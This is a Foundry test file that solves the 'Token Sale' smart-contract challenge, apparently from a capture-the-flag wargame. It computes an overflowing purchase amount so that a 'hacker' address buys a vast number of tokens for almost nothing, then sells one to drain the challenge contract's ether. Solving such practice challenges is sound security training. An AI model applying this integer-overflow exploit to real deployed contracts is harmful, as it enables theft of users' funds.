// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./TokenSaleChallenge.sol";

contract TokenSaleChallengeTest is Test {
    TokenSaleChallenge public tokenSaleChallenge;
    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);
        tokenSaleChallenge = new TokenSaleChallenge{value: 1 ether}();
    }

    function testTokenSale() public {
        emit log_named_uint("my balance", hacker.balance);
        emit log_named_uint("tokenSaleChallenge's balance", address(tokenSaleChallenge).balance);

        uint256 val;
        unchecked {
            val = (UINT256_MAX / 1 ether + 1) * 1 ether;
        }

        vm.startPrank(hacker);
        tokenSaleChallenge.buy{value: val}(UINT256_MAX / 1 ether + 1);

        emit log_named_uint("my new balance", hacker.balance);
        emit log_named_uint("tokenSaleChallenge balance", address(tokenSaleChallenge).balance);

        tokenSaleChallenge.sell(1);
        vm.stopPrank();

        emit log_named_uint("my new balance", hacker.balance);
        emit log_named_uint("tokenSaleChallenge balance", address(tokenSaleChallenge).balance);

        assertTrue(tokenSaleChallenge.isComplete());
    }
}
